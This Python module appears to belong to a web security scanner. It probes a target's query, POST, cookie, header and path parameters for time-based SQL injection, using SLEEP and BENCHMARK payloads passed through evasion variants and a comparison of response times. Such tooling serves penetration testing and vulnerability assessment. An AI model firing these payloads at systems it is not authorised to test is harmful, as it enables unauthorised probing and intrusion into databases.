import time
import urllib.parse
from ..utils import send_request, evasion_variants, average_response_time

_CACHE: dict[tuple, tuple[str, float]] = {}


def _cache_key(
    url: str,
    method: str,
    data: dict | None,
    cookies: dict | None,
    headers: dict | None,
) -> tuple:
    data_enc = urllib.parse.urlencode(sorted(data.items())) if data else ""
    cookies_t = tuple(sorted((cookies or {}).items()))
    headers_t = tuple(sorted((headers or {}).items()))
    return (url, method, data_enc, cookies_t, headers_t)

# Simple time-based SQL injection detection
PAYLOADS = [
    "' OR SLEEP(5)-- ",
    '" OR SLEEP(5)-- ',
    "' OR BENCHMARK(1000000,MD5(1))-- ",
    '" OR BENCHMARK(1000000,MD5(1))-- ',
]


def fetch(
    url: str,
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
    headers: dict | None = None,
    *,
    use_cache: bool = False,
) -> tuple[str, float]:
    """Fetch a URL using the given method and measure response time."""
    key = _cache_key(url, method, data, cookies, headers)
    if use_cache and key in _CACHE:
        return _CACHE[key]

    start = time.time()
    body = send_request(url, method=method, data=data, cookies=cookies, headers=headers)
    elapsed = time.time() - start

    if use_cache:
        _CACHE[key] = (body, elapsed)

    return body, elapsed

def test_parameter(
    url: str,
    param: str,
    value: str,
    delay_threshold: float = 5.0,
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
    headers: dict | None = None,
    location: str = "query",
    path_index: int | None = None,
):
    """Attempt time-based SQL injection on a parameter."""
    data = data or {}
    cookies = cookies or {}
    headers = headers or {}
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if location == "cookie":
        original = cookies.get(param, "")
        try:
            baseline_time, jitter = average_response_time(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
            )
        except Exception:
            baseline_time, jitter = 0.0, 0.0
    elif location == "header":
        original = headers.get(param, "")
        try:
            baseline_time, jitter = average_response_time(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
            )
        except Exception:
            baseline_time, jitter = 0.0, 0.0
    elif location == "path" and path_index is not None:
        segments = parsed.path.split("/")
        original = segments[path_index]
        try:
            baseline_time, jitter = average_response_time(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
            )
        except Exception:
            baseline_time, jitter = 0.0, 0.0
    elif method.lower() == "get":
        original = query.get(param, [""])[0]
        try:
            baseline_time, jitter = average_response_time(
                url,
                method="get",
                cookies=cookies,
                headers=headers,
            )
        except Exception:
            baseline_time, jitter = 0.0, 0.0
    else:
        original = data.get(param, "")
        try:
            baseline_time, jitter = average_response_time(
                url,
                method="post",
                data=data,
                cookies=cookies,
                headers=headers,
            )
        except Exception:
            baseline_time, jitter = 0.0, 0.0

    stable = jitter < (delay_threshold / 2)

    results = []
    for payload in PAYLOADS:
        for variant in evasion_variants(payload):
            if location == "cookie":
                new_cookies = cookies.copy()
                new_cookies[param] = original + variant
                new_url = url
                try:
                    _, elapsed = fetch(
                        new_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=new_cookies,
                        headers=headers,
                    )
                except Exception:
                    elapsed = 0.0
            elif location == "header":
                new_headers = headers.copy()
                new_headers[param] = original + variant
                new_url = url
                try:
                    _, elapsed = fetch(
                        new_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=cookies,
                        headers=new_headers,
                    )
                except Exception:
                    elapsed = 0.0
            elif location == "path" and path_index is not None:
                segments = parsed.path.split("/")
                segments[path_index] = original + variant
                new_path = "/".join(segments)
                new_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
                try:
                    _, elapsed = fetch(
                        new_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=cookies,
                        headers=headers,
                    )
                except Exception:
                    elapsed = 0.0
            elif method.lower() == "get":
                query[param] = original + variant
                new_query = urllib.parse.urlencode(query, doseq=True)
                new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                try:
                    _, elapsed = fetch(new_url, cookies=cookies, headers=headers)
                except Exception:
                    elapsed = 0.0
            else:
                post_data = data.copy()
                post_data[param] = original + variant
                new_url = url
                try:
                    _, elapsed = fetch(
                        new_url,
                        method="post",
                        data=post_data,
                        cookies=cookies,
                        headers=headers,
                    )
                except Exception:
                    elapsed = 0.0

            vulnerable = (elapsed - baseline_time) > delay_threshold and stable
            results.append(
                {
                    'url': new_url,
                    'param': param,
                    'payload': variant,
                    'vulnerable': vulnerable,
                }
            )
    return results
